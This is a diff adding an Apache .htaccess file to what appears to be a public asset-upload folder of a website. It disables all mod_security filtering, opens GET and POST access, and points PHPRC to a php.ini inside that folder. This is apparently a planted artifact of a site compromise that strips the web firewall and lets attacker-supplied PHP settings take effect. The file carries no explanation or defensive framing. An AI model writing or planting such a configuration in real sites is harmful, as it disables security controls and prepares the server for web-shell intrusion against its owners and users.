@@ -1,0 +1,18 @@
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+SecFilterCheckURLEncoding Off
+SecFilterCheckCookieFormat Off
+SecFilterCheckUnicodeEncoding Off
+SecFilterNormalizeCookies Off
+</IfModule>
+<Limit GET POST>
+order deny,allow
+deny from all
+allow from all
+</Limit>
+<Limit PUT DELETE>
+order deny,allow
+deny from all
+</Limit>
+SetEnv PHPRC /var/www/vhosts/coursemagix.com/httpdocs/public/assets/front/files/ghost/php.ini
